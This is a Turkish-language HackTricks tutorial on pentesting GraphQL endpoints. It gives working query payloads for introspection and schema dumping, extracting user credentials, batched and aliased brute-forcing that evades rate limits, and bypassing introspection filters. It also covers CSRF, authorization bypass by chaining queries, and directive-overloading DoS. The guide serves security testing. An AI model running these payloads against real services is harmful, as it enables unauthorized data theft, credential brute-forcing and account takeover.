# GraphQL

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>ile</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Giriş

GraphQL, backend'den veri sorgulamak için basitleştirilmiş bir yaklaşım sunarak REST API'ye **verimli bir alternatif** olarak **ön plana çıkar**. REST'in aksine, genellikle verileri toplamak için çeşitli uç noktalarda çok sayıda istek gerektiren GraphQL, tüm gerekli bilgilerin **tek bir istek** aracılığıyla alınmasını sağlar. Bu basitleştirme, veri alım süreçlerinin karmaşıklığını azaltarak geliştiricilere önemli ölçüde **fayda sağlar**.

## GraphQL ve Güvenlik

GraphQL gibi yeni teknolojilerin ortaya çıkmasıyla yeni güvenlik açıkları da ortaya çıkar. **GraphQL'ın varsayılan olarak kimlik doğrulama mekanizmalarını içermediği** önemli bir noktadır. Bu tür güvenlik önlemlerini uygulamak geliştiricilerin sorumluluğundadır. Doğru kimlik doğrulama olmadan, GraphQL uç noktaları kimlik doğrulanmamış kullanıcılara hassas bilgileri açığa çıkarabilir, bu da ciddi bir güvenlik riski oluşturabilir.

### Dizin Brute Force Saldırıları ve GraphQL

Açığa çıkarılmış GraphQL örneklerini tanımlamak için dizin brute force saldırılarında belirli yolların dahil edilmesi önerilir. Bu yollar şunlardır:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Açık GraphQL örneklerinin tanımlanması, desteklenen sorguların incelenmesine olanak tanır. Bu, uç noktadan erişilebilen verileri anlamak için önemlidir. GraphQL'in keşif sistemi, bir şemanın desteklediği sorguları detaylandırarak bunu kolaylaştırır. Bu konuda daha fazla bilgi için GraphQL belgelerindeki keşif bölümüne bakın: [**GraphQL: API'ler için bir sorgu dili.**](https://graphql.org/learn/introspection/)

### Parmak İzi

[**graphw00f**](https://github.com/dolevf/graphw00f) aracı, bir sunucuda kullanılan GraphQL motorunu tespit edebilir ve ardından güvenlik denetçisi için bazı yararlı bilgileri yazdırabilir.

#### Evrensel sorgular <a href="#universal-queries" id="universal-queries"></a>

Bir URL'nin bir GraphQL servisi olup olmadığını kontrol etmek için bir **evrensel sorgu**, `query{__typename}`, gönderilebilir. Yanıt `{"data": {"__typename": "Query"}}` içeriyorsa, URL'nin bir GraphQL uç noktası barındırdığını doğrular. Bu yöntem, GraphQL'in sorgulanan nesnenin türünü ortaya çıkaran `__typename` alanına dayanır.

```javascript
query{__typename}
```

### Temel Numaralandırma

Graphql genellikle **GET**, **POST** (x-www-form-urlencoded) ve **POST**(json) destekler. Güvenlik açısından, CSRF saldırılarını önlemek için yalnızca json'a izin vermek önerilir.

#### İçgörü

Şema bilgilerini keşfetmek için içgörüyü kullanmak için `__schema` alanını sorgulayın. Bu alan, tüm sorguların kök türünde mevcuttur.

```bash
query={__schema{types{name,fields{name}}}}
```

Bu sorgu ile kullanılan tüm tiplerin adını bulacaksınız:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Bu sorgu ile tüm tipleri, alanlarını ve argümanlarını (ve argümanların türünü) çıkarabilirsiniz. Veritabanını sorgulamanın nasıl yapılacağını bilmek çok faydalı olacaktır.

![](<../../.gitbook/assets/image (207) (3).png>)

**Hatalar**

**Hataların** gösterilip gösterilmeyeceğini bilmek ilginç olacaktır, çünkü bu faydalı **bilgiler** sağlayabilir.

```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

**Introspeksiyon Yoluyla Veritabanı Şemasını Sıralama**

{% hint style="info" %}
Eğer introspeksiyon etkinleştirilmişse ancak yukarıdaki sorgu çalışmıyorsa, sorgu yapısından `onOperation`, `onFragment` ve `onField` direktiflerini kaldırmayı deneyin.
{% endhint %}

```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```

Satır içi denetim sorgusu:

```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```

Son kod satırı, graphql'den tüm meta bilgileri (nesne adları, parametreler, tipler...) dökecek bir graphql sorgusudur.

![](<../../.gitbook/assets/image (206).png>)

Eğer introspeksiyon etkinse, [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) kullanarak GUI'de tüm seçenekleri görüntüleyebilirsiniz.

### Sorgulama

Veritabanında hangi tür bilgilerin kaydedildiğini bildiğimize göre, **bazı değerler çıkarmayı** deneyelim.

Introspeksiyonda **doğrudan sorgulayabileceğiniz nesneyi** bulabilirsiniz (çünkü bir nesneyi sorgulayamazsınız sadece var olduğu için). Aşağıdaki görüntüde "_queryType_"'ın "_Query_" olarak adlandırıldığını ve "_Query_" nesnesinin alanlarından birinin "_flags_" olduğunu görebilirsiniz, ki bu da bir nesne türüdür. Dolayısıyla bayrak nesnesini sorgulayabilirsiniz.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Sorgunun türü "_flags_"'in "_Flags_" olduğuna dikkat edin ve bu nesnenin aşağıdaki gibi tanımlandığını görebilirsiniz:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

"_Flags_" nesnelerinin **ad** ve **değer** ile oluşturulduğunu görebilirsiniz. Sonra bayrakların tüm adlarını ve değerlerini aşağıdaki sorgu ile alabilirsiniz:

```javascript
query={flags{name, value}}
```

Not: Eğer sorgulanacak nesne string gibi ilkel bir türse, aşağıdaki örnekte olduğu gibi, sadece sorgulayabilirsiniz:

![](<../../.gitbook/assets/image (441).png>)

```javascript
query={hiddenFlags}
```

Başka bir örnekte, "_Query_" türü nesnesi içinde 2 nesne olan "_user_" ve "_users_" vardı.\
Bu nesnelerin aranması için herhangi bir argümana ihtiyaç duymadıklarında, istediğiniz verileri sormak suretiyle **tüm bilgileri alabilirsiniz**. Bu örnekte, internetten kaydedilmiş kullanıcı adlarını ve şifreleri çıkarabilirsiniz:

![](<../../.gitbook/assets/image (208).png>)

Ancak, bu örnekte bunu denerseniz bu **hata** ile karşılaşırsınız:

![](<../../.gitbook/assets/image (210).png>)

Görünüşe göre, bir şekilde "_**uid**_" türünde bir _**Int**_ argümanını kullanarak arama yapacak.\
Neyse ki, zaten bunu biliyorduk, [Temel Numaralandırma](graphql.md#basic-enumeration) bölümünde bize gerekli tüm bilgileri gösteren bir sorgu önerilmişti: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Eğer o sorguyu çalıştırdığımda sağlanan resmi okursanız, "_**user**_"'ın _Int_ türünde "_**uid**_" argümanına sahip olduğunu göreceksiniz.

Bu nedenle, hafif bir _**uid**_ bruteforce gerçekleştirerek _**uid**=**1**_ için bir kullanıcı adı ve şifre elde ettim:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Dikkat edin, "_**user**_" ve "_**password**_" parametrelerini isteyebileceğimi **keşfettim** çünkü var olmayan bir şey aramaya çalışırsam (`query={user(uid:1){noExists}}`) bu hatayı alırım:

![](<../../.gitbook/assets/image (213).png>)

Ve **numaralandırma aşaması** sırasında "_**dbuser**_" nesnesinin "_**user**_" ve "_**password**_" alanlarına sahip olduğunu keşfettim.

**Sorgu dizesi dökme hilesi (teşekkürler @BinaryShadow\_)**

Eğer bir String türüyle arama yapabilirseniz, örneğin: `query={theusers(description: ""){username,password}}` ve **boş bir dize ararsanız**, tüm verileri dökecektir. (_Bu örnek, öğreticilerin örneğiyle ilgili değildir, bu örnekte "**theusers**" kullanarak "**description**" adlı bir String alanıyla arama yapabileceğinizi varsayalım_).

### Arama

Bu kurulumda, bir **veritabanı** kişileri ve filmleri içerir. **Kişiler** e-posta ve isimleriyle tanımlanır; filmler ise adları ve derecelendirmeleriyle tanımlanır. **Kişiler** birbirleriyle arkadaş olabilir ve ayrıca filmlere sahip olabilir, veritabanı içindeki ilişkileri gösterir.

Kişileri **isimlerine göre arayabilir** ve e-postalarını alabilirsiniz:

```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```

Kişileri **adlarına** göre **aramak** ve **abone oldukları** **filmleri** almak için:

```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```

Not alınarak `subscribedMovies`'ın `name` özelliğinin alınması belirtilmiştir.

Aynı anda **birkaç nesne aranabilir**. Bu durumda, 2 film araması yapılır:

```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```

Ya da hatta **farklı nesnelerin ilişkileri için takma adlar kullanarak**:

```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```

### Mutations

**Mutations, sunucu tarafında değişiklik yapmak için kullanılır.**

**Introspection** içinde **tanımlanmış mutasyonları** bulabilirsiniz. Aşağıdaki görüntüde "_MutationType_" "_Mutation_" olarak adlandırılır ve "_Mutation_" nesnesi mutasyonların isimlerini içerir (bu durumda "_addPerson_" gibi):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

Bu yapıda bir **veritabanı**, **kişileri** ve **filmleri** içerir. **Kişiler** **e-posta** ve **isimleri** ile tanımlanır; **filmler** ise **isimleri** ve **puanları** ile tanımlanır. **Kişiler** birbirleriyle arkadaş olabilir ve ayrıca filmlere sahip olabilir, veritabanındaki ilişkileri gösterir.

Veritabanına yeni **film eklemek** için bir mutasyon aşağıdaki gibi olabilir (bu örnekte mutasyon `addMovie` olarak adlandırılmıştır):

```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```

**Sorguda hem verilerin hem de veri türünün nasıl belirtildiğine dikkat edin.**

Ayrıca, veritabanı mevcut **arkadaşlar** ve **filmler** ile ilişkilendirilmiş **kişilerin** oluşturulmasına izin veren `addPerson` adında bir **mutasyon** işlemini destekler. Arkadaşlar ve filmlerin, yeni oluşturulan kişiye bağlanmadan önce veritabanında önceden var olması gerektiğini unutmamak önemlidir.

```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```

### Yönerge Aşırı Yükleme

[**Bu raporda açıklanan zafiyetlerden birinde**](https://www.landh.tech/blog/20240304-google-hack-50000/) belirtildiği gibi, bir yönerge aşırı yükleme, sunucunun işlemleri boşa harcayacak şekilde bir yönergeyi milyonlarca kez çağırma anlamına gelir ve ardından DoS saldırısı yapılabilir hale gelir.

### 1 API isteğinde kaba kuvvet saldırısını topluca yapma

Bu bilgi [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/) adresinden alınmıştır.\
**Farklı kimlik bilgileri ile birlikte birçok sorguyu aynı anda göndererek GraphQL API üzerinden kimlik doğrulama**. Bu klasik bir kaba kuvvet saldırısıdır, ancak şimdi GraphQL toplu işleme özelliği sayesinde HTTP isteği başına birden fazla giriş/şifre çifti göndermek mümkün hale gelmiştir. Bu yaklaşım, harici hız izleme uygulamalarını, her şeyin yolunda olduğunu ve şifre denemesi yapan bir botun olmadığını düşünmelerine kandırabilir.

Aşağıda, **aynı anda 3 farklı e-posta/şifre çifti** ile uygulama kimlik doğrulama isteğinin en basit gösterimi bulunmaktadır. Açıkça aynı şekilde tek bir istekte binlerce göndermek mümkündür:

![](<../../.gitbook/assets/image (182) (1).png>)

Yanıt ekran görüntüsünden görebileceğimiz gibi, ilk ve üçüncü istekler _null_ döndürdü ve ilgili bilgileri _error_ bölümünde yansıttı. **İkinci mutasyon doğru kimlik doğrulama** verilerine sahipti ve yanıt doğru kimlik doğrulama oturum belirteci içeriyordu.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL İntrospeksiyon Olmadan

Daha fazla **graphql uç noktası introspeksiyonu devre dışı bırakıyor**. Bununla birlikte, graphql'in beklenmeyen bir istek aldığında fırlattığı hatalar, [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) gibi araçların çoğu şemayı yeniden oluşturmasına olanak tanır.

Ayrıca, Burp Suite uzantısı [**GraphQuail**](https://github.com/forcesunseen/graphquail) uzantısı, Burp üzerinden geçen GraphQL API isteklerini **izler** ve her yeni sorguyu gördüğünde içsel bir GraphQL **şeması oluşturur**. Ayrıca şemayı GraphiQL ve Voyager için açığa çıkarabilir. Uzantı, bir içgörü sorgusu aldığında sahte bir yanıt döndürür. Sonuç olarak, GraphQuail API içinde kullanılabilecek tüm sorguları, argümanları ve alanları gösterir. Daha fazla bilgi için [**buraya bakın**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

[**GraphQL varlıklarını keşfetmek için güzel bir kelime listesi burada bulunabilir**](https://github.com/Escape-Technologies/graphql-wordlist?).

### GraphQL İntrospeksiyon Savunmalarını Atlatma <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **GraphQL İntrospeksiyon Savunmalarını Atlatma**

API'lerde introspeksiyon sorgularına getirilen kısıtlamaları atlamak için, `__schema` kelimesinden sonra **özel bir karakter eklemek** etkili olabilir. Bu yöntem, introspeksiyonu engellemeyi amaçlayan regex desenlerinde yaygın geliştirici hatalarını sömürür. GraphQL'in görmezden geldiği ancak regex'te hesaba katılmamış olabilecek karakterler ekleyerek, kısıtlamalar atlatılabilir. Örneğin, `__schema`'dan sonra bir satır sonu ekleyen bir introspeksiyon sorgusu, bu tür savunmaları atlayabilir:

```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```

Eğer başarısız olursanız, yalnızca POST isteklerine kısıtlamalar uygulanmış olabileceğinden **GET istekleri** veya **`x-www-form-urlencoded` ile POST** gibi alternatif istek yöntemlerini düşünebilirsiniz.

### **Açığa Çıkarılmış GraphQL Yapılarını Keşfetme**

İntrospeksiyon devre dışı bırakıldığında, JavaScript kütüphanelerinde önceden yüklenmiş sorguları incelemek yararlı bir stratejidir. Bu sorgular, geliştirici araçlarındaki `Kaynaklar` sekmesi kullanılarak bulunabilir ve API'nin şeması hakkında bilgi sağlayarak potansiyel olarak **açığa çıkarılmış hassas sorguları** ortaya çıkarabilir. Geliştirici araçları içinde arama yapmak için kullanılan komutlar:

```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```

## GraphQL'de CSRF

CSRF nedir bilmiyorsanız aşağıdaki sayfayı okuyun:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Dışarıda, **CSRF tokenları olmadan yapılandırılmış** birkaç GraphQL uç noktası bulabileceksiniz.

GraphQL istekleri genellikle **`application/json`** Content-Type'ı kullanılarak POST istekleri aracılığıyla gönderilir.

```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```

Ancak, çoğu GraphQL uç noktası ayrıca **`form-urlencoded` POST isteklerini de destekler:**

```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```

Bu nedenle, önceki gibi CSRF istekleri **önişlem istekleri olmadan** gönderildiğinden, bir CSRF'yi kötüye kullanarak GraphQL'de **değişiklikler** yapmak mümkündür.

Ancak, Chrome'un `samesite` bayrağının yeni varsayılan çerez değeri `Lax` olduğuna dikkat edin. Bu, çerezin yalnızca üçüncü taraf web sitelerinden GET isteklerinde gönderileceği anlamına gelir.

Ayrıca, **sorgu** isteğinin bir **GET** isteği olarak da gönderilebileceğini ve CSRF belirtecinin GET isteğinde doğrulanmamış olabileceğini unutmayın.

Ayrıca, bir [**XS-Search**](../../pentesting-web/xs-search/) **saldırısını** kötüye kullanarak kullanıcının kimlik bilgilerini kötüye kullanarak GraphQL uç noktasından içerik sızdırmak mümkün olabilir.

Daha fazla bilgi için **buradaki** [**orijinal yazıya**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html) **bakın**.

## GraphQL'de Yetkilendirme

Uç noktada tanımlanan birçok GraphQL işlevi, yalnızca istekte bulunanın kimlik doğrulamasını kontrol edebilir ancak yetkilendirmeyi kontrol etmeyebilir.

Sorgu giriş değişkenlerinin değiştirilmesi, hassas hesap ayrıntılarına yol açabilir [sızdırıldı](https://hackerone.com/reports/792927).

Mutasyon, başka bir hesap verisini değiştirmeye çalışarak hatta hesap ele geçirmeye yol açabilir.

```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```

### GraphQL'de Yetkilendirme Atlatma

[Query'leri zincirleme](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) zayıf bir kimlik doğrulama sistemini atlayabilir.

Aşağıdaki örnekte işlemin "forgotPassword" olduğunu ve yalnızca buna ilişkin forgotPassword sorgusunun yürütülmesi gerektiğini görebilirsiniz. Bu, sona bir sorgu ekleyerek atlatılabilir, bu durumda "register" ve sisteme yeni bir kullanıcı olarak kaydedilmesi için bir kullanıcı değişkeni ekliyoruz.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## GraphQL'de Aliases Kullanarak Sınırı Atlatma

GraphQL'de, alias'ler API isteği yapılırken özelliklerin **açıkça adlandırılmasına** olanak tanıyan güçlü bir özelliktir. Bu yetenek, tek bir istekte **aynı türdeki nesnelerin birden fazla örneğini** almak için özellikle kullanışlıdır. Alias'ler, GraphQL nesnelerinin aynı ada sahip birden fazla özelliğe sahip olmasını engelleyen kısıtlamayı aşmak için kullanılabilir.

GraphQL alias'lerinin detaylı anlaşılması için aşağıdaki kaynak önerilir: [Alias'ler](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Alias'lerin asıl amacı birçok API çağrısına gerek duymayı azaltmaktır, ancak alias'lerin yanlışlıkla kullanılabileceği bir durum tespit edilmiştir: alias'ler, GraphQL uç noktasında kaba kuvvet saldırıları gerçekleştirmek için kullanılabilir. Bu, bazı uç noktaların kaba kuvvet saldırılarını sınırlayarak **HTTP isteklerinin sayısını** kısıtlayan hız sınırlayıcılarla korunduğu için mümkündür. Bununla birlikte, bu hız sınırlayıcılar her istekteki işlemlerin sayısını hesaba katmayabilir. Alias'ler, bir HTTP isteğinde birden fazla sorgunun dahil edilmesine izin verdiği için bu tür hız sınırlama önlemlerini atlayabilir.

Aşağıdaki örnekte, alias'li sorguların mağaza indirim kodlarının geçerliliğini doğrulamak için nasıl kullanılabileceği gösterilmektedir. Bu yöntem, birçok indirim kodunun aynı anda doğrulanmasına izin vererek hız sınırlamayı atlayabilir.

```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```

## Araçlar

### Zayıflık tarayıcıları

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Şemaları almak ve hassas verileri aramak, yetkilendirme testi yapmak, şemaları kaba kuvvet uygulamak ve belirli bir türe giden yolları bulmak için kullanılabilen bir araç seti.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Bağımsız olarak veya [Burp uzantısı](https://github.com/doyensec/inql) olarak kullanılabilir.
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Saldırıları otomatikleştirmek için CLI istemcisi olarak da kullanılabilir.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Bir GraphQL şemasında belirli bir türe ulaşmanın farklı yollarını listeleyen bir araç.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Gelişmiş GraphQL testi için Burp uzantısı. _**Tarayıcı**_, InQL v5.0'ın çekirdeğidir, burada bir GraphQL uç noktasını veya yerel bir içgörü şema dosyasını analiz edebilirsiniz. Tüm olası sorguları ve mutasyonları otomatik olarak oluşturur ve analiziniz için yapılandırılmış bir görünüme yerleştirir. _**Saldırgan**_ bileşeni, kötü uygulanmış hız sınırlarını atlamak için kullanışlı olabilecek toplu GraphQL saldırıları çalıştırmanıza olanak tanır.

### İstemciler

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI istemcisi
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI İstemcisi

### Otomatik Testler

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQL'yi açıklayan video: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Referanslar

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* **💬** [**Discord grubuna katılın**](https://discord.gg/hRep4RUj7f) veya [telegram grubuna katılın](https://t.me/peass) veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek katkıda bulunun.**

</details>
